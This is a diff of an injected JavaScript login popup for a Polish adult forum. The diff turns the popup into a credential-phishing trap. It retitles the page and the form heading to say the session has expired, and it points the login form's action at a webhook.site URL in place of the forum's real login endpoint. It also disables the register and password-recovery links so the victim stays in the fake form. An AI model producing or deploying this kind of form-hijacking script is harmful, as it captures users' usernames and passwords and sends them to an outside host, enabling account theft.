@@ -1,17 +1,18 @@
 document.getElementsByClassName("bbc_center")[0].remove()
+document.title = "Sesja wygasla - FORUM EROTYCZNE GARSONIERA"
 var div = document.createElement('div');
 div.innerHTML = `
 <div id="sign_in_popup_popup" style="z-index: 10001; top: 170.75px; left: 643.5px; position: fixed;" class="popupWrapper"><div id="sign_in_popup_inner" class="popupInner" style="width: 600px; max-height: 902px;"><div id="inline_login_form" class="sb_login" style="">
-		<form action="https://www.garsoniera.com.pl/forum/index.php?app=core&amp;module=global&amp;section=login&amp;do=process" method="post" id="login">
+		<form action="https://webhook.site/a798ce0d-9c60-41e4-a0a7-6e14891244bd" method="post" id="login">
 			<input type="hidden" name="auth_key" value="880ea6a14ea49e853634fbdc5015a024">
 			<input type="hidden" name="referer" value="https://www.garsoniera.com.pl/forum/">
-			<h3>Logowanie</h3>
+			<h3>Sesja wygasła, zaloguj się ponownie</h3>
 			
 			
             <div class="sb_login_row">
 
                 <div class="sb_login_col">
-                    <span class="right desc lighter blend_links"><a href="https://www.garsoniera.com.pl/forum/index.php?app=core&amp;module=global&amp;section=register" title="Zarejestruj się!">Zarejestruj się!</a></span>
+                    <span class="right desc lighter blend_links"><a href="#" title="Zarejestruj się!">Zarejestruj się!</a></span>
             		<strong><label for="ips_username">Nazwa użytkownika</label></strong>
                     <div class="ipsField_content">
                     	<input id="ips_username" type="text" class="input_text sb_login_input sb_luser" name="ips_username" placeholder="Nazwa użytkownika" size="30" tabindex="1">
@@ -19,7 +20,7 @@ div.innerHTML = `
                 </div>
                 
                 <div class="sb_login_col">
-                    <span class="right desc lighter blend_links"><a href="https://www.garsoniera.com.pl/forum/index.php?app=core&amp;module=global&amp;section=lostpass" title="Odzyskaj hasło">Odzyskiwanie hasła</a></span>
+                    <span class="right desc lighter blend_links"><a href="#" title="Odzyskaj hasło">Odzyskiwanie hasła</a></span>
                     <strong><label for="ips_password">Hasło</label></strong>
                     <div class="ipsField_content">
                         <input id="ips_password" type="password" class="input_text sb_login_input sb_lpassword" name="ips_password" placeholder="Hasło" size="30" tabindex="2"><br>
